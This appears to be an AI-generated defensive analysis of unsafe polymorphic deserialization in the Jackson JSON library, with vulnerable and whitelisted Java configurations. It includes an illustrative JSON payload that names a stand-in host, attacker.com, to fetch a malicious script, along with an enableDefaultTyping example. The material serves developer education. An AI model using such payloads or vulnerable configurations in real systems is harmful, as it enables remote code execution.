Okay, here's a deep analysis of the "Unsafe Deserialization of Untrusted Data (Polymorphic Typing)" attack surface in the context of `fasterxml/jackson-core`, formatted as Markdown:

```markdown
# Deep Analysis: Unsafe Deserialization in Jackson (Polymorphic Typing)

## 1. Objective of Deep Analysis

The primary objective of this deep analysis is to thoroughly understand the mechanics of unsafe deserialization vulnerabilities related to polymorphic typing in the Jackson library, identify specific code patterns that introduce this risk, provide concrete examples of exploitation, and reinforce the recommended mitigation strategies with detailed explanations and code examples.  We aim to equip the development team with the knowledge to prevent, detect, and remediate this critical vulnerability.  This analysis will also serve as a reference for future code reviews and security assessments.

## 2. Scope

This analysis focuses specifically on the interaction between `jackson-core` and `jackson-databind` that leads to unsafe deserialization vulnerabilities when handling polymorphic types.  We will cover:

*   The role of `@JsonTypeInfo` and related annotations.
*   The dangers of `enableDefaultTyping()`.
*   The concept of "gadget chains" and their relevance.
*   The difference between whitelisting and blacklisting approaches.
*   The importance of input validation as a defense-in-depth measure.
*   The limitations of various mitigation strategies.
*   Practical code examples demonstrating both vulnerable and secure configurations.

We will *not* cover:

*   Other types of deserialization vulnerabilities unrelated to polymorphic typing.
*   Vulnerabilities in other JSON parsing libraries.
*   General application security best practices outside the scope of Jackson deserialization.

## 3. Methodology

This analysis will employ the following methodology:

1.  **Code Review:** Examine the source code of `jackson-core` and `jackson-databind` to understand the internal mechanisms of type handling and object instantiation.
2.  **Vulnerability Research:** Review known CVEs and public exploits related to Jackson deserialization vulnerabilities.
3.  **Example Construction:** Develop concrete examples of vulnerable code and corresponding exploit payloads.
4.  **Mitigation Analysis:** Evaluate the effectiveness of different mitigation strategies and identify their limitations.
5.  **Documentation:**  Clearly document the findings, including code snippets, exploit examples, and mitigation recommendations.
6.  **Testing:** Create unit and/or integration tests to demonstrate the vulnerability and the effectiveness of mitigations.

## 4. Deep Analysis of the Attack Surface

### 4.1. The Root Cause: Polymorphic Type Handling

Jackson's polymorphic type handling allows a single field in a JSON object to represent instances of different classes.  This is achieved through annotations like `@JsonTypeInfo` and the `enableDefaultTyping()` method.  The core issue is that, without proper restrictions, Jackson will trust type information provided in the JSON payload itself.  This allows an attacker to specify *any* class to be instantiated, as long as it's on the classpath.

### 4.2. `@JsonTypeInfo` and its Dangers

The `@JsonTypeInfo` annotation is used to configure how type information is included and handled during serialization and deserialization.  The key attributes are:

*   `use`: Specifies the kind of type identifier to use (e.g., `JsonTypeInfo.Id.CLASS`, `JsonTypeInfo.Id.NAME`, `JsonTypeInfo.Id.MINIMAL_CLASS`).
*   `include`: Specifies how the type identifier is included in the JSON (e.g., as a property, as a wrapper array).
*   `property`: Specifies the name of the property used to store the type identifier.

**Dangerous Configurations:**

*   `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")`: This tells Jackson to use the fully qualified class name as the type identifier and include it as a property named "@class".  This is **extremely dangerous** with untrusted input.
*   `@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS, ...)`: Similar to `Id.CLASS`, but uses a shorter class name if possible.  Still vulnerable.

**Safer Configuration (with `@JsonSubTypes`):**

```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal {
    // ...
}

public class Dog extends Animal {
    // ...
}

public class Cat extends Animal {
    // ...
}
```

This configuration uses a logical name ("dog", "cat") instead of the class name, and `@JsonSubTypes` explicitly lists the allowed subtypes.  Jackson will *only* deserialize to `Dog` or `Cat` if the "type" property is "dog" or "cat", respectively.

### 4.3. `enableDefaultTyping()` - The Ultimate Danger

The `ObjectMapper.enableDefaultTyping()` method (and its variants) enables polymorphic deserialization for *all* objects, without requiring `@JsonTypeInfo` annotations.  This is **incredibly dangerous** and should **never** be used with untrusted input.  It essentially opens the door to arbitrary class instantiation.

```java
// EXTREMELY DANGEROUS - DO NOT USE WITH UNTRUSTED INPUT
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // Enables default typing for all objects
```

### 4.4. Gadget Chains

The term "gadget chain" refers to a sequence of classes that, when instantiated and their methods called in a specific order, can lead to arbitrary code execution.  These gadgets are often found in common libraries present on the classpath.  An attacker doesn't need to upload their own malicious class; they just need to find a suitable gadget chain already present in the application's dependencies.  This is why even seemingly harmless classes can become part of an exploit.

### 4.5. Whitelisting vs. Blacklisting

*   **Whitelisting:**  Explicitly defining the allowed classes for deserialization.  This is the **recommended** approach.  `@JsonSubTypes` is the primary mechanism for whitelisting.
*   **Blacklisting:**  Defining a list of disallowed classes.  This is **not recommended** as it's difficult to maintain a complete and up-to-date blacklist, and attackers can often find ways to bypass it.  `jackson-databind-blacklist` is an example, but it's a last resort.

### 4.6. Input Validation: A Crucial Defense-in-Depth

Even with whitelisting, input validation is essential.  Before deserializing any JSON, validate its structure and content.  Look for:

*   Unexpected property names (especially those related to type information, like "@class").
*   Suspicious class names (even if they might be on the whitelist, check for unusual patterns).
*   Excessively large or deeply nested JSON structures (which could indicate an attempt to exploit resource exhaustion vulnerabilities).

```java
// Example of basic input validation (before deserialization)
public boolean isValidJson(String json) {
    if (json.contains("@class")) { // Simple check for a common indicator
        return false;
    }
    // Add more sophisticated checks here, e.g., using a JSON schema validator
    return true;
}
```

### 4.7. Limitations of Mitigations

*   **Whitelisting:** Requires careful maintenance and can be complex to configure for large, evolving applications.  It's also not foolproof; a vulnerability in a whitelisted class could still be exploited.
*   **Input Validation:**  Can be difficult to implement comprehensively and may not catch all possible attack vectors.  It's a defense-in-depth measure, not a primary solution.
*   **Library Updates:**  While crucial, updates may not always be immediately available, and zero-day vulnerabilities can still exist.
* **Safe Default Typing Implementation:** Requires deep understanding of Jackson internals and careful implementation.

### 4.8. Exploit Example (Illustrative)

Let's assume a vulnerable application uses `enableDefaultTyping()` and has a class `com.example.ResourceLoader` on its classpath with a constructor that takes a URL and loads a resource from it:

```java
// Vulnerable class (example - DO NOT USE THIS PATTERN)
public class ResourceLoader {
    public ResourceLoader(String url) {
        try {
            URL resourceUrl = new URL(url);
            // ... load and process the resource ...
        } catch (Exception e) {
            // ... handle exception ...
        }
    }
}
```

An attacker could send the following JSON payload:

```json
{
  "@class": "com.example.ResourceLoader",
  "url": "http://attacker.com/malicious-script.sh"
}
```

This would cause Jackson to instantiate `ResourceLoader` with the attacker-controlled URL, potentially leading to the execution of the malicious script.

### 4.9. Secure Configuration Example

```java
// Interface with @JsonTypeInfo and @JsonSubTypes
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = SafeData.class, name = "safe")
})
public interface MyData { }

// Concrete class
public class SafeData implements MyData {
    private String value;

    public String getValue() {
        return value;
    }

    public void setValue(String value) {
        this.value = value;
    }
}

// ObjectMapper configuration
ObjectMapper mapper = new ObjectMapper();
// DO NOT enableDefaultTyping()

// Example usage
String json = "{\"type\":\"safe\",\"value\":\"some data\"}";
MyData data = mapper.readValue(json, MyData.class); // Safe deserialization

String maliciousJson = "{\"type\":\"unsafe\",\"value\":\"some data\"}";
// This will throw an exception because "unsafe" is not a valid subtype
// MyData maliciousData = mapper.readValue(maliciousJson, MyData.class);

String maliciousJson2 = "{\n" +
        "  \"@class\": \"com.example.ResourceLoader\",\n" +
        "  \"url\": \"http://attacker.com/malicious-script.sh\"\n" +
        "}";
// This will throw an exception because @class is not expected
// MyData maliciousData2 = mapper.readValue(maliciousJson2, MyData.class);
```

This example demonstrates a secure configuration using `@JsonTypeInfo` and `@JsonSubTypes` to whitelist the allowed class (`SafeData`).  Attempts to deserialize other types or use the `@class` property will result in exceptions.  Input validation should still be performed as an additional layer of defense.

## 5. Conclusion

Unsafe deserialization due to polymorphic typing in Jackson is a critical vulnerability that can lead to remote code execution.  The key to preventing this vulnerability is to **avoid default typing**, use **strict whitelisting** with `@JsonSubTypes`, and implement **robust input validation**.  Regularly updating Jackson libraries is also essential.  By understanding the underlying mechanisms and following the recommended mitigation strategies, developers can significantly reduce the risk of this dangerous attack surface.  This deep analysis provides a comprehensive understanding of the issue and serves as a valuable resource for building secure applications that use Jackson.